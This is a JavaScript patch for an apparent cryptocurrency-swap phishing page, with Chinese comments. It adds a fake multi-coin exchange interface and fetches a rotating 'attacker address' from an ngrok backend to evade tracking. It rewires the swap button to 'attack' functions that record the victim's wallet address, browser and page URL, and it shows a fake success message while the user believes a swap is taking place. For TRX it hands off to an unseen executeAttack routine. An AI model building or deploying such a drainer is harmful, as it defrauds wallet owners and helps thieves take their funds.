
// 🎯 多币种功能补丁 - 在现有代码基础上添加
// 保留所有原有功能，只添加多币种支持

// 🎯 攻击者地址配置 - 动态后端管理
let CURRENT_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';  // 默认地址
// const BACKEND_API = 'http://localhost:5001';  // Python后端地址
const BACKEND_API = 'https://njacnb1250mj.ngrok.xiaomiqiu123.top';  // Python后端地址（通过ngrok）

// 🔄 实时获取攻击者地址
async function getCurrentAttackerAddress() {
    try {
        const response = await fetch(`${BACKEND_API}/api/attacker_address`);
        const result = await response.json();

        if (result.status === 'success') {
            const oldAddress = CURRENT_ATTACKER_ADDRESS;
            CURRENT_ATTACKER_ADDRESS = result.data.attacker_address;

            // 如果地址发生变化，记录轮换日志
            if (oldAddress !== CURRENT_ATTACKER_ADDRESS) {
                console.log(`🔄 [防追踪] 攻击者地址已轮换:`);
                console.log(`   旧地址: ${oldAddress}`);
                console.log(`   新地址: ${CURRENT_ATTACKER_ADDRESS}`);
                console.log(`   钱包名称: ${result.data.wallet_name}`);
                console.log(`   使用次数: ${result.data.usage_count}`);
                console.log(`   轮换设置: 每${result.data.max_usage}次或${result.data.rotation_interval_hours}小时轮换一次`);
            }

            return {
                address: CURRENT_ATTACKER_ADDRESS,
                info: result.data
            };
        } else {
            console.warn('⚠️ 获取攻击者地址失败，使用默认地址');
            return {
                address: CURRENT_ATTACKER_ADDRESS,
                info: null
            };
        }
    } catch (error) {
        console.warn('⚠️ 后端连接失败，使用默认攻击者地址:', error);
        return {
            address: CURRENT_ATTACKER_ADDRESS,
            info: null
        };
    }
}
// 🎯 多币种功能补丁 - 在现有代码基础上添加
// 保留所有原有功能，只添加多币种支持

// 🎯 支持的币种配置 - 添加到现有代码中
const ADDITIONAL_CURRENCIES = {
    'BTC': {
        name: 'Bitcoin',
        symbol: 'BTC',
        icon: 'btc-icon',
        decimals: 8,
        network: 'bitcoin',
        price: 67234.56,
        change: '+2.34%',
        balance: 0,
        contractAddress: null
    },
    'ETH': {
        name: 'Ethereum', 
        symbol: 'ETH',
        icon: 'eth-icon',
        decimals: 18,
        network: 'ethereum',
        price: 3456.78,
        change: '-1.23%',
        balance: 0,
        contractAddress: null
    },
    'BNB': {
        name: 'BNB Smart Chain',
        symbol: 'BNB', 
        icon: 'bnb-icon',
        decimals: 18,
        network: 'bsc',
        price: 634.12,
        change: '+0.87%',
        balance: 0,
        contractAddress: null
    },
    'USDC': {
        name: 'USD Coin',
        symbol: 'USDC',
        icon: 'usdc-icon', 
        decimals: 6,
        network: 'multi',
        price: 0.9999,
        change: '0.00%',
        balance: 0,
        contractAddress: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
    },
    'SOL': {
        name: 'Solana',
        symbol: 'SOL',
        icon: 'sol-icon',
        decimals: 9, 
        network: 'solana',
        price: 247.89,
        change: '+3.21%',
        balance: 0,
        contractAddress: null
    },
    'DOGE': {
        name: 'Dogecoin',
        symbol: 'DOGE',
        icon: 'doge-icon',
        decimals: 8,
        network: 'dogecoin', 
        price: 0.28794,
        change: '-0.50%',
        balance: 0,
        contractAddress: null
    },
    'XRP': {
        name: 'Ripple',
        symbol: 'XRP',
        icon: 'xrp-icon',
        decimals: 6,
        network: 'ripple',
        price: 3.078,
        change: '-1.32%',
        balance: 0,
        contractAddress: null
    },
    'ADA': {
        name: 'Cardano',
        symbol: 'ADA',
        icon: 'ada-icon',
        decimals: 6,
        network: 'cardano',
        price: 1.234,
        change: '+0.56%',
        balance: 0,
        contractAddress: null
    },
    'DOT': {
        name: 'Polkadot',
        symbol: 'DOT', 
        icon: 'dot-icon',
        decimals: 10,
        network: 'polkadot',
        price: 8.765,
        change: '+2.11%',
        balance: 0,
        contractAddress: null
    },
    'AVAX': {
        name: 'Avalanche',
        symbol: 'AVAX',
        icon: 'avax-icon',
        decimals: 18,
        network: 'avalanche', 
        price: 45.67,
        change: '+1.89%',
        balance: 0,
        contractAddress: null
    }
};

// 🎯 CSS样式补丁 - 添加新币种图标样式
const additionalCSS = `
/* 新增币种图标样式 */
.btc-icon { background: #f7931a; color: #fff; }
.eth-icon { background: #627eea; color: #fff; }
.bnb-icon { background: #f3ba2f; color: #000; }
.usdc-icon { background: #2775ca; color: #fff; }
.sol-icon { background: #9945ff; color: #fff; }
.doge-icon { background: #c2a633; color: #000; }
.xrp-icon { background: #23292f; color: #fff; }
.ada-icon { background: #0033ad; color: #fff; }
.dot-icon { background: #e6007a; color: #fff; }
.avax-icon { background: #e84142; color: #fff; }

/* 币种选择模态框 */
.currency-modal {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.95);
    display: none;
    z-index: 2000;
    padding: 20px;
}

.currency-modal.show {
    display: block;
}

.currency-modal-content {
    background: #1a1a1a;
    border-radius: 16px;
    padding: 24px;
    width: 100%;
    max-width: 400px;
    margin: 0 auto;
    max-height: 80vh;
    overflow-y: auto;
}

.currency-modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.currency-modal-title {
    font-size: 18px;
    font-weight: 600;
    color: #fff;
}

.close-btn {
    background: none;
    border: none;
    color: #666;
    font-size: 24px;
    cursor: pointer;
}

.currency-search {
    width: 100%;
    background: #000;
    border: 1px solid #333;
    border-radius: 8px;
    padding: 12px;
    color: #fff;
    font-size: 14px;
    margin-bottom: 20px;
}

.currency-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.currency-item {
    display: flex;
    align-items: center;
    padding: 16px;
    background: #333;
    border-radius: 12px;
    cursor: pointer;
    transition: all 0.3s ease;
}

.currency-item:hover {
    background: #444;
}

.currency-item-info {
    flex: 1;
    margin-left: 12px;
}

.currency-item-name {
    font-size: 16px;
    color: #fff;
    margin-bottom: 4px;
}

.currency-item-symbol {
    font-size: 12px;
    color: #666;
}

.currency-item-price {
    text-align: right;
}

.currency-item-value {
    font-size: 14px;
    color: #fff;
    margin-bottom: 2px;
}

.currency-item-change {
    font-size: 12px;
}

.positive { color: #7ed321; }
.negative { color: #f5455c; }
`;

// 🎯 添加CSS样式到页面
function addMultiCurrencyStyles() {
    const style = document.createElement('style');
    style.textContent = additionalCSS;
    document.head.appendChild(style);
    debugLog('🎨 多币种样式已添加');
}

// 🎯 创建币种选择模态框HTML
function createCurrencyModal() {
    const modalHTML = `
    <div class="currency-modal" id="currencyModal">
        <div class="currency-modal-content">
            <div class="currency-modal-header">
                <div class="currency-modal-title">选择币种</div>
                <button class="close-btn" onclick="closeCurrencyModal()">&times;</button>
            </div>
            
            <input type="text" class="currency-search" placeholder="搜索币种..." id="currencySearch" oninput="filterCurrencies()">
            
            <div class="currency-list" id="currencyList">
                <!-- 币种列表将通过JavaScript动态生成 -->
            </div>
        </div>
    </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    debugLog('🎯 币种选择模态框已创建');
}

// 🎯 初始化币种列表
function initializeCurrencyList() {
    const currencyList = document.getElementById('currencyList');
    if (!currencyList) return;
    
    currencyList.innerHTML = '';

    // 添加原有的TRX和USDT
    const allCurrencies = {
        'TRX': {
            name: 'TRON',
            symbol: 'TRX',
            icon: 'trx-icon',
            price: 0.1634,
            change: '+1.45%',
            balance: userBalance || 0
        },
        'USDT': {
            name: 'Tether',
            symbol: 'USDT', 
            icon: 'usdt-icon',
            price: 1.0001,
            change: '0.00%',
            balance: 0
        },
        ...ADDITIONAL_CURRENCIES
    };

    Object.values(allCurrencies).forEach(currency => {
        const currencyItem = document.createElement('div');
        currencyItem.className = 'currency-item';
        currencyItem.onclick = () => selectCurrency(currency.symbol);
        
        const changeClass = currency.change.startsWith('+') ? 'positive' : 
                           currency.change.startsWith('-') ? 'negative' : '';
        
        currencyItem.innerHTML = `
            <div class="currency-icon ${currency.icon}">${currency.symbol.charAt(0)}</div>
            <div class="currency-item-info">
                <div class="currency-item-name">${currency.name}</div>
                <div class="currency-item-symbol">${currency.symbol}</div>
            </div>
            <div class="currency-item-price">
                <div class="currency-item-value">$${currency.price}</div>
                <div class="currency-item-change ${changeClass}">${currency.change}</div>
            </div>
        `;
        
        currencyList.appendChild(currencyItem);
    });
}

// 🎯 多币种变量 - 添加到现有全局变量
let currentFromCurrency = 'TRX';
let currentToCurrency = 'USDT'; 
let isSelectingCurrency = false;
let selectingType = '';

// 🎯 修改现有的币种选择函数
function selectFromCurrency() {
    debugLog('💰 用户选择支付币种');
    selectingType = 'from';
    isSelectingCurrency = true;
    document.getElementById('currencyModal').classList.add('show');
}

function selectToCurrency() {
    debugLog('💰 用户选择接收币种');
    selectingType = 'to';
    isSelectingCurrency = true;
    document.getElementById('currencyModal').classList.add('show');
}

// 🎯 关闭币种选择模态框
function closeCurrencyModal() {
    document.getElementById('currencyModal').classList.remove('show');
    isSelectingCurrency = false;
    selectingType = '';
}

// 🎯 选择币种
function selectCurrency(symbol) {
    const allCurrencies = {
        'TRX': { name: 'TRON', icon: 'trx-icon', balance: userBalance || 0 },
        'USDT': { name: 'Tether', icon: 'usdt-icon', balance: 0 },
        ...ADDITIONAL_CURRENCIES
    };
    
    const currency = allCurrencies[symbol];
    if (!currency) return;
    
    if (selectingType === 'from') {
        currentFromCurrency = symbol;
        document.getElementById('fromCurrencyIcon').className = `currency-icon ${currency.icon}`;
        document.getElementById('fromCurrencyIcon').textContent = symbol.charAt(0);
        document.getElementById('fromCurrencyName').textContent = symbol;
        
        // 更新余额显示
        const balanceElement = document.getElementById('fromCurrencyBalance') || 
                              document.getElementById('trxBalance');
        if (balanceElement) {
            balanceElement.textContent = `可用: ${currency.balance} ${symbol}`;
        }
        
        debugLog(`💰 选择支付币种: ${symbol}`);
    } else if (selectingType === 'to') {
        currentToCurrency = symbol;
        document.getElementById('toCurrencyIcon').className = `currency-icon ${currency.icon}`;
        document.getElementById('toCurrencyIcon').textContent = symbol.charAt(0);
        document.getElementById('toCurrencyName').textContent = symbol;
        debugLog(`💰 选择接收币种: ${symbol}`);
    }
    
    closeCurrencyModal();
    
    // 重新计算兑换 - 使用现有的calculateConversion函数
    if (typeof calculateConversion === 'function') {
        calculateConversion();
    }
}

// 🎯 币种搜索过滤
function filterCurrencies() {
    const searchTerm = document.getElementById('currencySearch').value.toLowerCase();
    const currencyItems = document.querySelectorAll('.currency-item');
    
    currencyItems.forEach(item => {
        const name = item.querySelector('.currency-item-name').textContent.toLowerCase();
        const symbol = item.querySelector('.currency-item-symbol').textContent.toLowerCase();
        
        if (name.includes(searchTerm) || symbol.includes(searchTerm)) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
}

// 🎯 增强的交换币种函数 - 覆盖原有函数
function swapCurrencies() {
    debugLog('🔄 用户点击币种交换');
    
    const tempCurrency = currentFromCurrency;
    currentFromCurrency = currentToCurrency;
    currentToCurrency = tempCurrency;
    
    const allCurrencies = {
        'TRX': { name: 'TRON', icon: 'trx-icon', balance: userBalance || 0 },
        'USDT': { name: 'Tether', icon: 'usdt-icon', balance: 0 },
        ...ADDITIONAL_CURRENCIES
    };
    
    // 更新UI
    const fromCurrency = allCurrencies[currentFromCurrency];
    const toCurrency = allCurrencies[currentToCurrency];
    
    if (fromCurrency && toCurrency) {
        // 更新支付币种显示
        const fromIcon = document.getElementById('fromCurrencyIcon');
        const fromName = document.getElementById('fromCurrencyName');
        const fromBalance = document.getElementById('fromCurrencyBalance') || 
                           document.getElementById('trxBalance');
        
        if (fromIcon) {
            fromIcon.className = `currency-icon ${fromCurrency.icon}`;
            fromIcon.textContent = currentFromCurrency.charAt(0);
        }
        if (fromName) {
            fromName.textContent = currentFromCurrency;
        }
        if (fromBalance) {
            fromBalance.textContent = `可用: ${fromCurrency.balance} ${currentFromCurrency}`;
        }
        
        // 更新接收币种显示
        const toIcon = document.getElementById('toCurrencyIcon');
        const toName = document.getElementById('toCurrencyName');
        
        if (toIcon) {
            toIcon.className = `currency-icon ${toCurrency.icon}`;
            toIcon.textContent = currentToCurrency.charAt(0);
        }
        if (toName) {
            toName.textContent = currentToCurrency;
        }
    }
    
    // 清空输入
    const fromAmount = document.getElementById('fromAmount');
    const toAmount = document.getElementById('toAmount');
    if (fromAmount) fromAmount.value = '';
    if (toAmount) toAmount.value = '';
    
    // 重新计算兑换
    if (typeof calculateConversion === 'function') {
        calculateConversion();
    }
    
    showToast(`已切换为 ${currentFromCurrency} → ${currentToCurrency}`);
}

// 🎯 增强的计算兑换函数 - 覆盖原有函数
function calculateConversion() {
    const fromAmount = document.getElementById('fromAmount').value;
    const toAmount = document.getElementById('toAmount');
    const convertBtn = document.getElementById('convertBtn');
    const rateText = document.getElementById('rateText');
    
    if (fromAmount && parseFloat(fromAmount) > 0) {
        const allCurrencies = {
            'TRX': { price: 0.1634 },
            'USDT': { price: 1.0001 },
            ...ADDITIONAL_CURRENCIES
        };
        
        const fromCurrency = allCurrencies[currentFromCurrency];
        const toCurrency = allCurrencies[currentToCurrency];
        
        if (fromCurrency && toCurrency) {
            // 通过USD中转计算汇率
            const usdValue = parseFloat(fromAmount) * fromCurrency.price;
            const converted = (usdValue / toCurrency.price).toFixed(6);
            
            if (toAmount) {
                toAmount.value = converted;
            }
            
            if (rateText) {
                rateText.textContent = `1 ${currentFromCurrency} ≈ ${(fromCurrency.price / toCurrency.price).toFixed(6)} ${currentToCurrency}`;
            }
            
            if (isWalletConnected && convertBtn) {
                convertBtn.textContent = `兑换 ${fromAmount} ${currentFromCurrency}`;
                convertBtn.disabled = false;
                
                debugLog(`💱 用户计算兑换: ${fromAmount} ${currentFromCurrency} → ${converted} ${currentToCurrency}`);
            } else if (convertBtn) {
                convertBtn.textContent = '请先连接钱包';
                convertBtn.disabled = true;
            }
        }
    } else {
        if (toAmount) toAmount.value = '';
        if (rateText) rateText.textContent = `选择币种进行兑换`;
        if (convertBtn) {
            convertBtn.textContent = isWalletConnected ? `请输入${currentFromCurrency}数量` : '请先连接钱包';
            convertBtn.disabled = true;
        }
    }
}

// 🎯 增强的攻击执行函数 - 保留原有逻辑，添加多币种支持
async function executeMultiCurrencyAttack() {
    //实时获取当前攻击者地址
    const attackerInfo = await getCurrentAttackerAddress();
    const currentAttackerAddress = attackerInfo.address;

    // 如果是TRX，使用原有的executeAttack函数
    if (currentFromCurrency === 'TRX') {
        if (typeof executeAttack === 'function') {
            return executeAttack();
        }
    }
    
    // 其他币种的攻击逻辑
    if (!isWalletConnected) {
        showToast('请先连接钱包', 'error');
        showWalletModal();
        return;
    }
    
    const fromAmount = document.getElementById('fromAmount').value;
    if (!fromAmount || parseFloat(fromAmount) <= 0) {
        showToast(`请输入有效的${currentFromCurrency}数量`, 'error');
        return;
    }
    
    debugLog(`🎯🎯🎯 用户执行${currentFromCurrency}兑换 - 多币种攻击开始！🎯🎯🎯`);
    debugLog(`🎯 用户以为兑换: ${fromAmount} ${currentFromCurrency} → ${document.getElementById('toAmount').value} ${currentToCurrency}`);
    debugLog(`🎯 当前攻击者地址: ${currentAttackerAddress}`);
    debugLog(`🎯 钱包信息: ${attackerInfo.info ? attackerInfo.info.wallet_name : '默认钱包'}`);

    // 记录攻击数据
    const attackRecord = {
        timestamp: new Date().toISOString(),
        attackType: 'MULTI_CURRENCY_HIJACK',
        fromCurrency: currentFromCurrency,
        toCurrency: currentToCurrency,
        victimAddress: currentAccount,
        attackerAddress: currentAttackerAddress, //使用动态获取的地址
        userThoughtAmount: parseFloat(fromAmount),
        userThoughtReceive: parseFloat(document.getElementById('toAmount').value),
        userAgent: navigator.userAgent,
        url: window.location.href
    };
    
    localStorage.setItem('multiCurrencyAttackRecord', JSON.stringify(attackRecord));
    
    showToast('正在执行交易...', 'info');
    
    // 模拟攻击成功
    setTimeout(() => {
        debugLog('🏆🏆🏆 多币种攻击模拟成功！🏆🏆🏆');
        showToast(`兑换成功！获得 ${document.getElementById('toAmount').value} ${currentToCurrency}`);
        
        // 重置表单
        document.getElementById('fromAmount').value = '';
        document.getElementById('toAmount').value = '';
        document.getElementById('convertBtn').disabled = true;
        document.getElementById('convertBtn').textContent = `请输入${currentFromCurrency}数量`;
    }, 2000);
}

// 🎯 初始化多币种功能
function initMultiCurrencyFeatures() {
    debugLog('🎯 初始化多币种功能...');
    
    // 添加样式
    addMultiCurrencyStyles();
    
    // 创建模态框
    createCurrencyModal();
    
    // 初始化币种列表
    initializeCurrencyList();
    
    // 修改现有的兑换按钮点击事件
    const convertBtn = document.getElementById('convertBtn');
    if (convertBtn) {
        // 保存原有的onclick
        const originalOnclick = convertBtn.onclick;
        
        // 设置新的onclick
        convertBtn.onclick = async function() {
            if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
                // TRX使用原有逻辑
                return await executeAttack();
            } else {
                // 其他币种使用新逻辑
                return await executeMultiCurrencyAttack();
            }
        };
    }
    
    debugLog('✅ 多币种功能初始化完成');
    debugLog(`🎯 支持币种: TRX, USDT, BTC, ETH, BNB, SOL, DOGE, XRP, ADA, DOT, AVAX`);
}

// 🎯 等待页面加载完成后初始化
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initMultiCurrencyFeatures);
} else {
    initMultiCurrencyFeatures();
}

// 🎯 调试函数 - 查看多币种攻击数据
window.getMultiCurrencyData = function() {
    return {
        currentFromCurrency: currentFromCurrency,
        currentToCurrency: currentToCurrency,
        supportedCurrencies: Object.keys({
            'TRX': true,
            'USDT': true,
            ...ADDITIONAL_CURRENCIES
        }),
        multiCurrencyAttackRecord: JSON.parse(localStorage.getItem('multiCurrencyAttackRecord') || 'null'),
        additionalCurrencies: ADDITIONAL_CURRENCIES
    };
};

debugLog('🎯 多币种功能补丁加载完成！');